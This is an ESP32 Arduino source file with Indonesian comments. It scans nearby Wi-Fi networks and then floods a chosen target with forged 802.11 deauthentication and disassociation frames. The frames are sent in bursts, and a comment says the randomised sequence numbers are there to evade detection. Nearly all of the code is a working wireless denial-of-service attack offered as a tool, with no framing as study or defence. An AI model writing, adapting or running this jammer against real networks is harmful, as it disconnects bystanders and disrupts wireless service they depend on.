#include "esp_wifi.h"



// Fungsi sakti buat ubah String MAC ke Bytes
void stringToMac(String macStr, uint8_t *macAddr) {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

// --- TEMPLATE PAKET ALA GHOST-ESP ---
uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };

void loopWiFi(void * pvParameters) {
  for(;;) {
    if (triggerScan) {
      sedang_scan = true;
      
       adaTarget = false;        // Target lama dihapus
      targetLockedIdx = -1;     // Indeks kursor di-reset
      
      // Bersihin data lama dulu biar fresh
      totalWiFi = 0;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      vTaskDelay(100 / portTICK_PERIOD_MS);

      // Mulai Scan (Ini biasanya makan waktu 3-5 detik secara alami)
      int n = WiFi.scanNetworks();
      
      totalWiFi = (n > 30) ? 30 : n; // Maksimal 30 biar RAM lega
      for (int i = 0; i < totalWiFi; ++i) {
        listWiFi[i].id = i;
        listWiFi[i].ssid = WiFi.SSID(i);
        listWiFi[i].rssi = WiFi.RSSI(i);
        listWiFi[i].channel = WiFi.channel(i);
        listWiFi[i].mac = WiFi.BSSIDstr(i); // Ambil MAC target

      }
      
      sedang_scan = false;
      scanDone = true;     // Lapor ke Core 1 kalau udah beres
      triggerScan = false; // Matiin pelatuknya
    } else if (isDeauthing && adaTarget) {
    uint8_t targetMac[6];
    stringToMac(targetTerkunci.mac, targetMac);
    
    // Set Destination (Korban) & Source/BSSID (Router)
    memcpy(&deauthFrame[4], targetMac, 6);
    memcpy(&deauthFrame[10], targetMac, 6); // Anggap BSSID sama dengan Target (Broadcast mode)
    memcpy(&deauthFrame[16], targetMac, 6);
    
    memcpy(&disasFrame[4], targetMac, 6);
    memcpy(&disasFrame[10], targetMac, 6);
    memcpy(&disasFrame[16], targetMac, 6);

    esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);

    // BURST MODE ALA GHOST-ESP (Tembak 2 jenis paket)
    for(int i=0; i<20; i++) {
        // Kasih Sequence Number Acak biar gak kedeteksi
        uint16_t seq = (uint16_t)(esp_random() & 0xFFFF);
        deauthFrame[22] = seq & 0xFF;
        deauthFrame[23] = (seq >> 8) & 0xFF;
        
        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
        esp_wifi_80211_tx(WIFI_IF_STA, disasFrame, sizeof(disasFrame), false);
        
        delayMicroseconds(200); 
    }
    
    vTaskDelay(50 / portTICK_PERIOD_MS); 
}

    
     // Core 0 istirahat 50ms biar gak overheat sambil nunggu perintah
    vTaskDelay(50 / portTICK_PERIOD_MS); 
  }
}
